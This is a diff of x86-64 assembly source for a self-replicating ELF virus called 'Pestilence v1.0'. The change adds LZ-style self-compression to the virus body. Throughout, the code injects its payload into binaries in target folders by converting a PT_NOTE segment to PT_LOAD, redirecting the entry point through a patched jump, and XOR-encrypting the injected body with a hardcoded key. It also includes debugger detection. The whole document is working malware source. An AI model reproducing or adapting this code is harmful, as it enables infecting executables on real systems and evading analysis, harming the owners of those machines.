@@ -18,13 +18,50 @@ begin:
 	push r10
 	push r11
 
+	%push context
+	%stacksize flat64
+	%assign %$localsize 0
+
+	%local compressed_data_size:qword					; long compressed_data_size;
+	%xdefine compressed_data rbp - %$localsize - COMPRESSION_BUF_SIZE	; uint8_t compressed_data[COMPRESSION_BUF_SIZE]
+	%assign %$localsize %$localsize + COMPRESSION_BUF_SIZE			; ...
+
+	; Initializes stack frame
+	push rbp
+	mov rbp, rsp
+	sub rsp, %$localsize
+
 	call can_run_infection				; if (can_run_infection() == 0)
 	cmp rax, 0					; 	goto .skipped;
 	je .skipped					; ...
 
-	call infection_routine				; infection_routine();
+	; Set arguments of compression/decompression function
+	lea rdi, [compressed_data_size]			; _compressed_data_size_ptr = &compressed_data_size;
+	lea rsi, [compressed_data]			; _compressed_data = compressed_data;
+
+	mov rax, [rel compressed_data_size2]		; if (compressed_data_size2 == 0)
+	cmp rax, 0x0					; ...
+	je .compress					; 	goto .compress
+	jmp .decompress					; else goto .decompress
+.compress:
+	call compression				; compression(_compressed_data_size_ptr, _compressed_data);
+	jmp .end_compress				; goto .end_compress
+.decompress:
+	call decompression				; decompression(_compressed_data_size_ptr, _compressed_data);
+	jmp .end_compress				; goto .end_compress
+.end_compress:
+
+	mov rdi, [compressed_data_size]			; infection_routine (compressed_data_size, _real_begin_compressed_data_ptr);
+	lea rsi, [compressed_data]			; ...
+	add rsi, COMPRESSION_BUF_SIZE			; /* Ugly thing because of arbitraty COMPRESSION_BUF_SIZE
+	sub rsi, rdi					; ... */
+	call infection_routine				; ...
 
 .skipped:
+	add rsp, %$localsize
+	pop rbp
+	%pop
+
 	; restore all registers
 	pop r11
 	pop r10
@@ -36,13 +73,8 @@ begin:
 	pop rsi
 	pop rdi
 	pop rax
-_jmp_instr:
-	db 0xe9, 00, 00, 00, 00				; jump to default behavior of infected file
-							; or to next instruction if original virus
 
-	mov rax, SYS_EXIT				; exit(
-	xor rdi, rdi					; 0
-	syscall						; );
+	jmp jmp_instr
 
 ; int can_run_infection();
 ; rax can_run_infection();
@@ -62,7 +94,7 @@ can_run_infection:
 		je .valid					; 	goto .valid;
 		lea rdi, [rel begin]				; data = begin addr
 		add rdi, infection_routine - begin		; data += infection_routine - begin
-		mov rsi, cipher_stop - infection_routine	; size = cipher_stop - infection_routine
+		mov rsi, _end - infection_routine		; size = _end - infection_routine
 		lea rdx, [rel key]				; key = key
 		call xor_cipher					; xor_cipher(data, size, key)
 		; TODO: check file is really unciphered
@@ -135,16 +167,153 @@ xor_cipher:
 		pop rdx					; reset stack
 		ret					; return
 
-; void infection_routine()
-infection_routine:
-	lea rdi, [rel infected_folder_1]		; treate_folder(infected_folder_1);
-	call treate_folder				; ...
-	lea rdi, [rel infected_folder_2]		; treate_folder(infected_folder_2);
-	call treate_folder				; ...
+; void decompression(long *compressed_data_size_ptr, uint8_t *compressed_data_ptr);
+; void decompression(rdi compressed_data_size_ptr, rsi compressed_data_ptr);
+decompression:
+	%push context
+	%stacksize flat64
+	%assign %$localsize 0
+
+	%local compressed_data_size_ptr:qword		; long *compressed_data_size_ptr;
+	%local compressed_data_ptr:qword		; uint8_t *compressed_data_ptr;
+	%local cur_src:qword				; uint8_t *cur_src;
+	%local cur_dest:qword				; uint8_t *cur_dest;
+
+	; Initializes stack frame
+	push rbp
+	mov rbp, rsp
+	sub rsp, %$localsize
+
+	mov [compressed_data_size_ptr], rdi		; compressed_data_size_ptr = _compressed_data_size_ptr;
+	mov [compressed_data_ptr], rsi			; compressed_data_ptr = _compressed_data_ptr;
+
+	mov rax, [rel compressed_data_size2]		; *compressed_data_size_ptr = compressed_data_size2;
+	mov [rdi], rax					; ...
+
+	; Save compressed data for infected
+	lea rsi, [rel infection_routine]		; _src = infection_routine;
+	mov rdi, [compressed_data_ptr]			; _dest = compressed_data_ptr;
+	add rdi, COMPRESSION_BUF_SIZE			;  + COMPRESSION_BUF_SIZE
+	sub rdi, [rel compressed_data_size2]		;  - compressed_data_size2
+	mov rcx, [rel compressed_data_size2]		; _count = compressed_data_size2;
+	rep movsb					; memcpy(_dest, _src, _count);
+
+	lea rax, [rel infection_routine]		; cur_src = infection_routine + compressed_data_size2 - 1 ;
+	add rax, [rel compressed_data_size2]		; ...
+	dec rax						; ...
+	mov [cur_src], rax				; ...
+	lea rax, [rel _end - 1]				; cur_dest = _end - 1;
+	mov [cur_dest], rax				; ...
+
+.decompression_routine:
+	lea rax, [rel infection_routine]		; while (! (cur_src == infection_routine - 1)) {
+	dec rax						; ...
+	cmp [cur_src], rax				; ...
+	je .end_decompression_routine			; ...
+
+	mov rsi, [cur_src]				; if (*cur_src == COMPRESSION_TOKEN)
+	mov r8b, [rsi]					; ...
+	cmp r8b, COMPRESSION_TOKEN			; ...
+	je .decompress_token				; 	goto .decompress_token
+	mov rdi, [cur_dest]				; *cur_dest = *cur_src;
+	mov [rdi], r8b					; ...
+	dec qword [cur_src]				; cur_src--;
+	dec qword [cur_dest]				; cur_dest--;
+	jmp .decompression_routine			; continue;
+.decompress_token:
+	mov rax, [cur_src]				; _n_lookback = *--cur_src;
+	sub rax, 1					; ...
+	cmp byte [rax], 0				; if (_n_lookback == 0)
+	je .decompress_byte_token			;	goto .decompress_byte_token
+	xor rsi, rsi					; _pattern_ptr = _n_lookback + cur_dest;
+	mov sil, [rax]					; ...
+	add rsi, [cur_dest]				; ...
+	mov rdi, [cur_dest]				; _dest = cur_dest;
+
+	xor rcx, rcx					; _count = *--_cur_src;
+	sub rax, 1					; ...
+	mov cl, [rax]
+
+	; Get src data before writing. It can causes problems in case of overlapping of dest and src
+	xor r8, r8					; _count_save = _count;
+	mov r8b, cl					; ...
+
+	std						; reverse_memcpy(_dest, _src, _count);
+	rep movsb					; ...
+	cld						; ...
+
+	sub qword [cur_src], 3				; cur_src -= 3;
+	sub [cur_dest], r8				; cur_dest -= _count_save;
+
+	jmp .decompression_routine			; continue;
+
+.decompress_byte_token:
+	mov rdi, [cur_dest]				; *cur_dest = COMPRESSION_TOKEN;
+	mov byte [rdi], COMPRESSION_TOKEN		; ...
+	dec qword [cur_dest]				; cur_dest--;
+	sub qword [cur_src], 2				; cur_src -= 2;
+	jmp .decompression_routine			; continue;
+							; } // while
+.end_decompression_routine:
+	add rsp, %$localsize
+	pop rbp
+	%pop
+
 	ret
 
-; void treate_folder(char const *_folder);
-; void treate_folder(rdi folder);
+jmp_instr:
+	db 0xe9, 00, 00, 00, 00				; jump to default behavior of infected file
+							; or to next instruction if original virus
+	mov rax, SYS_EXIT				; exit(
+	xor rdi, rdi					; 0
+	syscall						; );
+
+; BEGIN FAKE .data SECTION
+infected_folder_1: db "/tmp/test/", 0
+infected_folder_2: db "/tmp/test2/", 0
+elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
+len_elf_64_magic: equ $ - elf_64_magic
+compressed_data_size2: dq 0x00				; Filled in infected
+key: db "S3cr3tK3y", 0
+debugged_message: db "DEBUG DETECTED, dommage ;) !", 0
+; never used but here to be copied in the binary
+signature: db "Pestilence v1.0 by jmaia and dhubleur", 0
+; END FAKE .data SECTION
+
+; void infection_routine(long _compressed_data_size, uint8_t *_real_begin_compressed_data_ptr)
+; void infection_routine(rdi _compressed_data_size, rsi _real_begin_compressed_data_ptr)
+infection_routine:
+	%push context
+	%stacksize flat64
+	%assign %$localsize 0
+
+	%local compressed_data_size:qword		; long compressed_data_size;
+	%local real_begin_compressed_data_ptr:qword	; uint8_t *real_begin_compressed_data_ptr
+
+	; Initializes stack frame
+	push rbp
+	mov rbp, rsp
+	sub rsp, %$localsize
+
+	mov [compressed_data_size], rdi			; compressed_data_size = _compressed_data_size;
+	mov [real_begin_compressed_data_ptr], rsi	; real_begin_compressed_data_ptr = _real_begin_compressed_data_ptr;
+
+	lea rdi, [rel infected_folder_1]		; treate_folder(infected_folder_1, compressed_data_size, _real_begin_compressed_data_ptr);
+	mov rsi, [compressed_data_size]			; ...
+	mov rdx, [real_begin_compressed_data_ptr]	; ...
+	call treate_folder				; ...
+	lea rdi, [rel infected_folder_2]		; treate_folder(infected_folder_2, compressed_data_size, _real_begin_compressed_data_ptr);
+	mov rsi, [compressed_data_size]			; ...
+	mov rdx, [real_begin_compressed_data_ptr]	; ...
+	call treate_folder				; ...
+
+	add rsp, %$localsize
+	pop rbp
+	%pop
+	ret
+
+; void treate_folder(char const *_folder, long _compressed_data_size, uint8_t *_compressed_data_ptr);
+; void treate_folder(rdi folder, rsi _compressed_data_size, rdx _compressed_data_ptr);
 treate_folder:
 	%push context
 	%stacksize flat64
@@ -155,6 +324,8 @@ treate_folder:
 	%local cur_offset:qword				; long cur_offset;
 	%local read_bytes:qword				; long read_bytes;
 	%local cur_dirent:qword				; void *cur_dirent;
+	%local compressed_data_size:qword		; long compressed_data_size;
+	%local compressed_data_ptr:qword		; uint8_t *compressed_data_ptr;
 	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
 	%assign %$localsize %$localsize + BUFFER_SIZE	; ...
 
@@ -164,6 +335,8 @@ treate_folder:
 	sub rsp, %$localsize
 
 	mov [folder], rdi				; folder = _folder;
+	mov [compressed_data_size], rsi			; compressed_data_size = _compressed_data_size;
+	mov [compressed_data_ptr], rdx			; compressed_data_ptr = _compressed_data_ptr;
 
 	; Open folder
 	mov rax, SYS_OPEN				; _ret = open(
@@ -194,9 +367,11 @@ treate_folder:
 	add rax, [cur_offset]				; ...
 	mov [cur_dirent], rax				; ...
 
-	mov rdi, [folder]				; treat_file(folder;
+	mov rdi, [folder]				; treat_file(folder,
 	mov rsi, [cur_dirent]				; 	cur_dirent
-	add rsi, linux_dirent64.d_name			; 		->d_name
+	add rsi, linux_dirent64.d_name			; 		->d_name,
+	mov rdx, [compressed_data_size]			;	compressed_data_size,
+	mov rcx, [compressed_data_ptr]			;	compressed_data_ptr;
 	call treat_file					; );
 
 	mov rax, [cur_dirent]				; _reclen_ptr = cur_dirent->d_reclen;
@@ -225,8 +400,8 @@ treate_folder:
 	%pop
 	ret
 
-; void treat_file(char const *_dirname, char const *_filename);
-; void treat_file(rdi dirname, rsi filename);
+; void treat_file(char const *_dirname, char const *_filename, long _compressed_data_size, uint8_t *_compressed_data_ptr);
+; void treat_file(rdi dirname, rsi filename, rdx _compressed_data_size, rcx _compressed_data_ptr);
 treat_file:
 	%push context
 	%stacksize flat64
@@ -242,6 +417,8 @@ treat_file:
 	%local new_vaddr:qword				; Elf64_addr new_vaddr;
 	%local payload_size:qword			; long payload_size;
 	%local offset_to_sub_mmap:qword			; long offset_to_sub_mmap;
+	%local compressed_data_size:qword		; long compressed_data_size;
+	%local compressed_data_ptr:qword		; long compressed_data_ptr;
 	%xdefine pathbuf rbp - %$localsize - PATH_MAX	; uint8_t pathbuf[PATH_MAX];
 	%assign %$localsize %$localsize + PATH_MAX	; ...
 	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
@@ -254,6 +431,8 @@ treat_file:
 
 	mov [dirname], rdi				; dirname = _dirname;
 	mov [filename], rsi				; filename = _filename;
+	mov [compressed_data_size], rdx			; compressed_data_size = _compressed_data_size;
+	mov [compressed_data_ptr], rcx			; compressed_data_ptr = _compressed_data_ptr;
 
 	xor r8, r8					; len = 0;
 	lea rdi, [pathbuf]				; dest = pathbuf;
@@ -274,9 +453,9 @@ treat_file:
 		movsb					; *dest++ = *src++;
 		cmp byte [rsi], 0			; if (*src != 0)
 		jnz .filename				; 	goto .filename;
-	
+
 	mov byte [rdi], 0				; *dest = 0;
-	
+
 
 	; Open file
 	mov rax, SYS_OPEN				; _ret = open(
@@ -306,8 +485,9 @@ treat_file:
 	; https://stackoverflow.com/questions/15684771/how-to-portably-extend-a-file-accessed-using-mmap
 	mov rax, SYS_MMAP				; _ret = mmap(
 	xor rdi, rdi					; 	0,
-	mov rsi, [filesize]				; 	filesize + (_end - _start),
-	add rsi, _end - _start				;	...
+	mov rsi, [filesize]				; 	filesize
+	add rsi, infection_routine - begin		;	  + (infection_routine - begin)
+	add rsi, [compressed_data_size]			;	  + compressed_data_size
 	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
 	mov r10, MAP_PRIVATE | MAP_ANONYMOUS		; 	MAP_PRIVATE | MAP_ANONYMOUS,
 	mov r8, -1					; 	-1,
@@ -356,11 +536,11 @@ treat_file:
 	mov rdi, _end - begin				; payload_size = _end - begin;
 	mov [payload_size], rdi				; ...
 
-	; TODO rcx peut être différent de r8 si on fait de la compression
 	mov rdi, [mappedfile]				; ret = convert_pt_note_to_load(mappedfile,
 	mov rsi, [payload_offset]			; payload_offset,
 	mov rdx, [new_vaddr]				; next_vaddr,
-	mov rcx, [payload_size]				; payload_size,
+	mov rcx, infection_routine - begin		; (infection_routine - begin)
+	add rcx, [compressed_data_size]			;   + compressed_data_size
 	mov r8, [payload_size]				; payload_size,
 	call convert_pt_note_to_load			; );
 	cmp rax, 0					; if (ret == 0)
@@ -369,7 +549,8 @@ treat_file:
 	mov rax, SYS_FTRUNCATE				; _ret = ftruncate(
 	mov rdi, [fd]					; fd,
 	mov rsi, [filesize]				; filesize
-	add rsi, [payload_size]				; + payload_size
+	add rsi, infection_routine - begin		; + (infection_routine - begin)
+	add rsi, [compressed_data_size]			; + compressed_data_size
 	syscall						; );
 	cmp rax, 0					; if (_ret < 0)
 	jl .unmap_file					; 	goto .unmap_file
@@ -388,7 +569,8 @@ treat_file:
 							;	_addr,
 	mov rsi, [filesize]				; 	filesize
 	sub rsi, [offset_to_sub_mmap]			;	  - offset_to_sub_mmap,
-	add rsi, [payload_size]				;	  + payload_size
+	add rsi, infection_routine - begin		;	  + (infection_routine - begin)
+	add rsi, [compressed_data_size]			;	  + compressed_data_size
 	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
 	mov r10, MAP_SHARED | MAP_FIXED			; 	MAP_SHARED | MAP_FIXED,
 	mov r8, [fd]					; 	fd,
@@ -397,39 +579,55 @@ treat_file:
 	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
 	je .unmap_file					; 	goto .unmap_file
 
-	; copy all bytes between _start and _end to the segment
-	mov rdi, [mappedfile]				; dest = file_map + filesize;
+	; TODO Add a noop again to avoid lldb issues with infected
+	; copy all bytes between begin and infection_routine to the segment
+	mov rdi, [mappedfile]				; _dest = file_map + filesize;
 	add rdi, [filesize]				; ...
-	lea rsi, [rel begin]				; src = begin; //TODO Fuck lldb
-	mov rcx, _end - begin				; len = _end - begin;
-	rep movsb					; memcpy(dest, src, len);
-	
+	lea rsi, [rel begin]				; _src = begin;
+	mov rcx, infection_routine - begin		; _len = infection_routine - begin;
+	rep movsb					; memcpy(_dest, _src, _len);
+
+	; copy all compressed bytes between infection_routine and _end to the segment
+	mov rdi, [mappedfile]				; _dest = file_map
+	add rdi, [filesize]				; 	+ filesize
+	add rdi, infection_routine - begin		; 	+ (infection_routine - begin);
+	mov rsi, [compressed_data_ptr]			; _src = compressed_data_ptr;
+	mov rcx, [compressed_data_size]			; _len = compressed_data_size;
+	rep movsb					; memcpy(_dest, _src, _len);
+
 	; compute jmp_value
 	mov rdi, [mappedfile]				; _jmp_value = file_map
 	add rdi, elf64_hdr.e_entry			; 	->e_entry;
 	mov eax, [rdi]					; ...
 
 	sub eax, [new_vaddr]				; _jmp_value -= new_vaddr;
-	sub eax, _jmp_instr - begin			; _jmp_value -= _jmp_instr - begin;
+	sub eax, jmp_instr - begin			; _jmp_value -= jmp_instr - begin;
 	sub eax, 5					; _jmp_value -= 5; // Size of jmp instruction
 
 	; change jmp_value in injected code
-	mov rdi, [mappedfile]				; jmp_value_ptr = file_map + filesize + (_end - _start) - 8 (8 is the size of the jmp_value variable);
+	mov rdi, [mappedfile]				; _jmp_value_ptr = file_map
 	add rdi, [filesize]				; 	+ filesize
-	add rdi, _jmp_instr - begin			; 	+ (_jmp_inst - begin)
+	add rdi, jmp_instr - begin			; 	+ (jmp_instr - begin)
 	inc rdi						; 	+ 1;
-	mov [rdi], eax					; *jmp_value_ptr = _jmp_value;
+	mov [rdi], eax					; *_jmp_value_ptr = _jmp_value;
+
+	; change compressed_data_size2 in injected code
+	mov rdi, [mappedfile]				; _compressed_data_size2_ptr = file_map
+	add rdi, [filesize]				; 	+ filesize
+	add rdi, compressed_data_size2 - begin		; 	+ (compressed_data_size2 - begin)
+	mov rax, [compressed_data_size]			; *_compressed_data_size2_ptr = compressed_data_size;
+	mov [rdi], rax					; ...
 
 	mov rdi, [mappedfile]				; _e_entry = &mappedfile->e_entry;
 	add rdi, elf64_hdr.e_entry			; ...
 	mov rax, [new_vaddr]				; *_e_entry = new_vaddr;
 	mov [rdi], rax					; ...
 
-	; xor cipher all injected bytes between infection_routine and cipher_stop
+	; xor cipher all injected bytes between infection_routine and _end
 	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - begin);
 	add rdi, [filesize]				;
 	add rdi, infection_routine - begin		;
-	mov rsi, cipher_stop - infection_routine	; size = cipher_stop - infection_routine
+	mov rsi, _end - infection_routine		; size = _end - infection_routine
 	lea rdx, [rel key]				; key = key
 	call xor_cipher					; xor_cipher(data, size, key)
 
@@ -528,7 +726,7 @@ get_next_available_vaddr:
 	pop rbp
 	%pop
 	ret						; return _next_available_vaddr;
-	
+
 
 ; int is_elf_64(char const *file_map);
 ; rax is_elf_64(rdi file_map);
@@ -544,7 +742,7 @@ is_elf_64:
 		cmp rsi, len_elf_64_magic		; 	if (counter == len_elf_64_magic)
 		je .end_equal				; 		goto end_equal;
 		jmp .begin_magic_loop			; }
-	
+
 	.end_not_equal:
 		xor rax, rax				; return 0;
 		ret
@@ -776,15 +974,154 @@ convert_pt_note_to_load:
 	%pop
 	ret						; return _ret;
 
-section .data
-	infected_folder_1: db "/tmp/test/", 0
-	infected_folder_2: db "/tmp/test2/", 0
-	elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
-	len_elf_64_magic: equ $ - elf_64_magic
-cipher_stop:
-	key db "S3cr3tK3y", 0
-	debugged_message: db "DEBUG DETECTED, dommage ;) !", 0
-	; never used but here to be copied in the binary
-	signature: db "Pestilence v1.0 by jmaia and dhubleur"
-
 _end:
+
+; TODO Create label "outside children/infected" or something like that
+
+; void compression(long *compressed_data_size_ptr, uint8_t *compressed_data_ptr);
+; void compression(rdi compressed_data_size_ptr, rsi compressed_data_ptr);
+compression:
+	%push context
+	%stacksize flat64
+	%assign %$localsize 0
+
+	%local compressed_data_size_ptr:qword	; long *compressed_data_size_ptr;
+	%local compressed_data_ptr:qword	; uint8_t *compressed_data_ptr;
+	%local i_src:qword			; long i_src;
+	%local i_dest:qword			; long i_dest;
+	%local i_haystack:qword			; long i_haystack;
+	%local i_haystack_limit:qword		; long i_haystack_limit;
+	%local i_needle:qword			; long i_needle;
+	%local best_offset_subbyte:qword	; long best_offset_subbyte;
+	%local best_len_subbyte:qword		; long best_len_subbyte;
+	%local src_end_ptr:qword		; uint8_t *src_end_ptr;
+	%local dest_end_ptr:qword		; uint8_t *dest_end_ptr;
+	%local len_subbyte:qword		; long len_subbyte;
+
+	push rbp
+	mov rbp, rsp
+	sub rsp, %$localsize
+
+	mov [compressed_data_size_ptr], rdi
+	mov [compressed_data_ptr], rsi
+
+	lea rax, [rel _end - 1]			; src_end_ptr = _end - 1;
+	mov [src_end_ptr], rax			; ...
+	mov rax, [compressed_data_ptr]		; dest_end_ptr = compressed_data_ptr + COMPRESSION_BUF_SIZE - 1;
+	add rax, COMPRESSION_BUF_SIZE - 1	; ...
+	mov [dest_end_ptr], rax			; ...
+
+	mov qword [i_src], 0			; i_src = 0;
+	mov qword [i_dest], 0			; i_dest = 0;
+
+.begin_compression:				; while (i_src < payload_length) {
+	cmp qword [i_src], _end - infection_routine ; ...
+	jge .end_compression			; ...
+	xor rdi, rdi				; _i_haystack_limit = 0;
+	mov rax, [i_src]			; if (i_src > 255) {
+	sub rax, 255				; ...
+	cmp qword [i_src], 255			; ...
+	cmova rdi, rax				; 	_i_haystack_limit = i_src - 255; }
+	mov [i_haystack_limit], rdi		; i_haystack_limit = _i_haystack_limit;
+	mov qword [best_len_subbyte], 0		; best_len_subbyte = 0;
+
+.begin_lookup_haystack:				; while (i_haystack_limit < i_src) {
+	mov rax, [i_haystack_limit]		; ...
+	cmp rax, [i_src]			; ...
+	jge .end_lookup_haystack		; ...
+
+	mov [i_haystack], rax			; i_haystack = i_haystack_limit;
+	mov qword [len_subbyte], 0		; len_subbyte = 0;
+	mov rax, [i_src]			; i_needle = i_src;
+	mov qword [i_needle], rax		; ...
+
+.begin_lookup_needle:				; while (i_haystack < i_src
+	; No need to test if i_src is bigger than size of source because compression will always
+	; be the same and we tested it at least one time. So it is not bigger than the source
+	mov rax, [i_haystack]			; ...
+	cmp rax, [i_src]			; ...
+	jge .end_lookup_needle			; ...
+
+	mov rax, [src_end_ptr]			; 	&& src_end_ptr[-i_haystack] != src_end_ptr[-i_needle]) {
+	sub rax, [i_haystack]			; ...
+	mov r8b, [rax]				; ...
+	mov rax, [src_end_ptr]			; ...
+	sub rax, [i_needle]			; ...
+	mov r9b, [rax]				; ...
+	cmp r8b, r9b				; ...
+	jne .end_lookup_needle			; ...
+
+	inc qword [len_subbyte]			; i_len_subbyte++;
+	inc qword [i_haystack]			; i_haystack++;
+	inc qword [i_needle]			; i_needle++;
+	jmp .begin_lookup_needle		; }
+
+.end_lookup_needle:
+
+	mov rdi, [i_src]			; _cur_offset_subbyte = i_src - i_haystack;
+	sub rdi, [i_haystack_limit]		; ...
+	mov r8, [best_len_subbyte]		; _best_len_subbyte = best_len_subbyte;
+	mov r9, [best_offset_subbyte]		; _best_offset_subbyte = best_offset_subbyte;
+	mov rax, [len_subbyte]			; if (len_subbyte > best_len_subbyte) {
+	cmp rax, [best_len_subbyte]		; ...
+	cmova r8, rax				; 	_best_len_subbyte = len_subbyte;
+	cmova r9, rdi				; 	_best_offset_subbyte = _cur_offset_subbyte;}
+	mov [best_len_subbyte], r8		; best_len_subbyte = _best_len_subbyte;
+	mov [best_offset_subbyte], r9		; best_offset_subbyte = _best_offset_subbyte;
+	inc qword [i_haystack_limit]		; i_haystack_limit++;
+	jmp .begin_lookup_haystack		; }
+
+.end_lookup_haystack:
+
+	cmp qword [best_len_subbyte], 3		; if (best_len_subbyte > 3) //length of a token
+	jg .write_token				; ...
+	jmp .write_byte				; ...
+
+.write_token:					; {
+	; TODO Fix size of variables, play with byte/qword, it is ugly
+	mov rax, [dest_end_ptr]			; 	_cur_dest_ptr = dest_end_ptr;
+	sub rax, [i_dest]			; 	_cur_dest_ptr -= i_dest;
+	mov byte [rax], COMPRESSION_TOKEN	; 	*_cur_dest_ptr = COMPRESSION_TOKEN;
+	dec rax					; 	_cur_dest_ptr--;
+	mov rdi, [best_offset_subbyte]		; 	*_cur_dest_ptr = best_offset_subbyte;
+	mov byte [rax], dil			; 	...
+	dec rax					; 	_cur_dest_ptr--;
+	mov rdi, [best_len_subbyte]		; 	*_cur_dest_ptr = best_len_subbyte;
+	mov byte [rax], dil			; 	...
+	add qword [i_dest], 3			;	i_dest += 3;
+	add [i_src], rdi			;	i_src += best_len_subbyte;
+	jmp .end_write_byte_or_token		; }
+	
+.write_byte:					; else if (*src_end_ptr != COMPRESSION_TOKEN) {
+	mov rsi, [src_end_ptr]			; 	...
+	sub rsi, [i_src]			; 	...
+	cmp byte [rsi], COMPRESSION_TOKEN	; 	...
+	je .write_token_byte			; 	...
+	mov rdi, [dest_end_ptr]			; 	dest_end_ptr[-i_dest] = src_end_ptr[-i_src];
+	sub rdi, [i_dest]			; 	...
+	movsb					; 	...
+	inc qword [i_dest]			; 	i_dest++;
+	inc qword [i_src]			; 	i_src++;
+	jmp .end_write_byte_or_token		; }
+
+.write_token_byte:				; else {
+	mov rax, [dest_end_ptr]			; 	_cur_dest_ptr = dest_end_ptr;
+	sub rax, [i_dest]			; 	_cur_dest_ptr -= i_dest;
+	mov byte [rax], COMPRESSION_TOKEN	;	*_cur_dest_ptr = COMPRESSION_TOKEN;
+	dec rax					; 	_cur_dest_ptr--;
+	mov byte [rax], 0			; 	*_cur_dest_ptr = 0;
+	add qword [i_dest], 2
+	inc qword [i_src]
+.end_write_byte_or_token:			; }
+	jmp .begin_compression			; }
+
+.end_compression:
+	mov rax, [i_dest]			; _compressed_data_size = i_dest;
+	mov rdi, [compressed_data_size_ptr]	; *compressed_data_size_ptr = _compressed_data_size;
+	mov [rdi], rax				; ...
+
+	add rsp, %$localsize
+	pop rbp
+	%pop
+
+	ret
